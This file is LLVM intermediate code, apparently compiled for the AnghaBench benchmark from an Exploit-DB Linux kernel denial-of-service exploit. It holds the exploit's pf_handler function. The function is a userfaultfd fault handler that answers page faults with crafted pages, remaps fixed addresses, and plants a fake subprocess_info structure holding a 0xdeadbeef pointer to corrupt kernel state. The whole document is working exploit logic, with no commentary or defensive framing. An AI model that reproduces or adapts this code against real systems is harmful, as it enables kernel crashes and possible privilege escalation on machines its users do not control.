; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44301.c_pf_handler.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44301.c_pf_handler.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_struct = type { i32, i32 }
%struct.uffd_msg = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i64 }
%struct.pollfd = type { i32, i32, i32 }
%struct.uffdio_copy = type { i64, i64, i64, i64 }
%struct.subprocess_info = type { i8*, i64 }

@POLLIN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"poll userfaultfd\00", align 1
@POLLERR = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"read userfaultfd\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"short read, not expected, exiting\0A\00", align 1
@pagesize = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@UFFDIO_COPY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c"ioctl(UFFDIO_COPY)\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @pf_handler(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_struct*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.uffd_msg, align 8
  %7 = alloca [1 x %struct.pollfd], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64*, align 8
  %14 = alloca %struct.uffdio_copy, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.subprocess_info*, align 8
  store i8* %0, i8** %2, align 8
  %18 = load i8*, i8** %2, align 8
  %19 = bitcast i8* %18 to %struct.thread_struct*
  store %struct.thread_struct* %19, %struct.thread_struct** %3, align 8
  %20 = load %struct.thread_struct*, %struct.thread_struct** %3, align 8
  %21 = getelementptr inbounds %struct.thread_struct, %struct.thread_struct* %20, i32 0, i32 0
  %22 = load i32, i32* %21, align 4
  store i32 %22, i32* %4, align 4
  %23 = load %struct.thread_struct*, %struct.thread_struct** %3, align 8
  %24 = getelementptr inbounds %struct.thread_struct, %struct.thread_struct* %23, i32 0, i32 1
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* %5, align 4
  br label %26

26:                                               ; preds = %137, %70, %60, %40, %38, %1
  %27 = load %struct.thread_struct*, %struct.thread_struct** %3, align 8
  %28 = getelementptr inbounds %struct.thread_struct, %struct.thread_struct* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 4
  %30 = getelementptr inbounds [1 x %struct.pollfd], [1 x %struct.pollfd]* %7, i64 0, i64 0
  %31 = getelementptr inbounds %struct.pollfd, %struct.pollfd* %30, i32 0, i32 0
  store i32 %29, i32* %31, align 4
  %32 = load i32, i32* @POLLIN, align 4
  %33 = getelementptr inbounds [1 x %struct.pollfd], [1 x %struct.pollfd]* %7, i64 0, i64 0
  %34 = getelementptr inbounds %struct.pollfd, %struct.pollfd* %33, i32 0, i32 1
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds [1 x %struct.pollfd], [1 x %struct.pollfd]* %7, i64 0, i64 0
  %36 = call i32 @poll(%struct.pollfd* %35, i32 1, i32 -1)
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %8, align 4
  switch i32 %37, label %42 [
    i32 -1, label %38
    i32 0, label %40
    i32 1, label %41
  ]

38:                                               ; preds = %26
  %39 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  br label %26

40:                                               ; preds = %26
  br label %26

41:                                               ; preds = %26
  br label %44

42:                                               ; preds = %26
  %43 = call i32 @exit(i32 2) #4
  unreachable

44:                                               ; preds = %41
  %45 = getelementptr inbounds [1 x %struct.pollfd], [1 x %struct.pollfd]* %7, i64 0, i64 0
  %46 = getelementptr inbounds %struct.pollfd, %struct.pollfd* %45, i32 0, i32 2
  %47 = load i32, i32* %46, align 4
  %48 = load i32, i32* @POLLERR, align 4
  %49 = and i32 %47, %48
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %44
  %52 = call i32 @exit(i32 1) #4
  unreachable

53:                                               ; preds = %44
  %54 = getelementptr inbounds [1 x %struct.pollfd], [1 x %struct.pollfd]* %7, i64 0, i64 0
  %55 = getelementptr inbounds %struct.pollfd, %struct.pollfd* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 4
  %57 = load i32, i32* @POLLIN, align 4
  %58 = and i32 %56, %57
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %61, label %60

60:                                               ; preds = %53
  br label %26

61:                                               ; preds = %53
  %62 = load i32, i32* %5, align 4
  %63 = call i32 @read(i32 %62, %struct.uffd_msg* %6, i32 8)
  store i32 %63, i32* %9, align 4
  %64 = load i32, i32* %9, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %73

66:                                               ; preds = %61
  %67 = load i64, i64* @errno, align 8
  %68 = load i64, i64* @EAGAIN, align 8
  %69 = icmp eq i64 %67, %68
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  br label %26

71:                                               ; preds = %66
  %72 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %61
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = icmp ne i64 %75, 8
  br i1 %76, label %77, label %81

77:                                               ; preds = %73
  %78 = load i32, i32* @stderr, align 4
  %79 = call i32 @fprintf(i32 %78, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %80 = call i32 @exit(i32 1) #4
  unreachable

81:                                               ; preds = %73
  %82 = getelementptr inbounds %struct.uffd_msg, %struct.uffd_msg* %6, i32 0, i32 0
  %83 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %82, i32 0, i32 0
  %84 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %83, i32 0, i32 0
  %85 = load i64, i64* %84, align 8
  store i64 %85, i64* %10, align 8
  %86 = load i32, i32* @pagesize, align 4
  %87 = zext i32 %86 to i64
  %88 = call i8* @llvm.stacksave()
  store i8* %88, i8** %11, align 8
  %89 = alloca i8, i64 %87, align 16
  store i64 %87, i64* %12, align 8
  %90 = bitcast i8* %89 to i64*
  store i64* %90, i64** %13, align 8
  %91 = load i32, i32* @pagesize, align 4
  %92 = call i32 @memset(i8* %89, i8 signext 66, i32 %91)
  %93 = ptrtoint i8* %89 to i64
  %94 = getelementptr inbounds %struct.uffdio_copy, %struct.uffdio_copy* %14, i32 0, i32 0
  store i64 %93, i64* %94, align 8
  %95 = load i64, i64* %10, align 8
  %96 = and i64 %95, -4096
  %97 = getelementptr inbounds %struct.uffdio_copy, %struct.uffdio_copy* %14, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  %98 = load i32, i32* @pagesize, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.uffdio_copy, %struct.uffdio_copy* %14, i32 0, i32 2
  store i64 %99, i64* %100, align 8
  %101 = getelementptr inbounds %struct.uffdio_copy, %struct.uffdio_copy* %14, i32 0, i32 3
  store i64 0, i64* %101, align 8
  %102 = load i32, i32* %4, align 4
  %103 = icmp ne i32 %102, 3
  br i1 %103, label %104, label %125

104:                                              ; preds = %81
  %105 = load i32, i32* %4, align 4
  %106 = srem i32 %105, 2
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %108, label %109

108:                                              ; preds = %104
  store i8* inttoptr (i64 1073741824 to i8*), i8** %15, align 8
  br label %110

109:                                              ; preds = %104
  store i8* inttoptr (i64 1073745920 to i8*), i8** %15, align 8
  br label %110

110:                                              ; preds = %109, %108
  %111 = load i8*, i8** %15, align 8
  %112 = call i32 @munmap(i8* %111, i32 4096)
  %113 = load i8*, i8** %15, align 8
  %114 = load i32, i32* @PROT_READ, align 4
  %115 = load i32, i32* @PROT_WRITE, align 4
  %116 = or i32 %114, %115
  %117 = load i32, i32* @MAP_PRIVATE, align 4
  %118 = load i32, i32* @MAP_ANON, align 4
  %119 = or i32 %117, %118
  %120 = call i8* @mmap(i8* %113, i32 4096, i32 %116, i32 %119, i32 -1, i32 0)
  store i8* %120, i8** %16, align 8
  %121 = load i8*, i8** %15, align 8
  %122 = load i32, i32* %4, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %4, align 4
  %124 = call i32 @setup_pagefault(i8* %121, i32 4096, i32 %123)
  br label %130

125:                                              ; preds = %81
  store %struct.subprocess_info* inttoptr (i64 1073745832 to %struct.subprocess_info*), %struct.subprocess_info** %17, align 8
  %126 = load %struct.subprocess_info*, %struct.subprocess_info** %17, align 8
  %127 = getelementptr inbounds %struct.subprocess_info, %struct.subprocess_info* %126, i32 0, i32 1
  store i64 0, i64* %127, align 8
  %128 = load %struct.subprocess_info*, %struct.subprocess_info** %17, align 8
  %129 = getelementptr inbounds %struct.subprocess_info, %struct.subprocess_info* %128, i32 0, i32 0
  store i8* inttoptr (i64 3735928559 to i8*), i8** %129, align 8
  br label %130

130:                                              ; preds = %125, %110
  %131 = load i32, i32* %5, align 4
  %132 = load i32, i32* @UFFDIO_COPY, align 4
  %133 = call i32 @ioctl(i32 %131, i32 %132, %struct.uffdio_copy* %14)
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %135, label %137

135:                                              ; preds = %130
  %136 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  br label %137

137:                                              ; preds = %135, %130
  %138 = load i8*, i8** %11, align 8
  call void @llvm.stackrestore(i8* %138)
  br label %26
}

declare dso_local i32 @poll(%struct.pollfd*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @read(i32, %struct.uffd_msg*, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @setup_pagefault(i8*, i32, i32) #1

declare dso_local i32 @ioctl(i32, i32, %struct.uffdio_copy*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
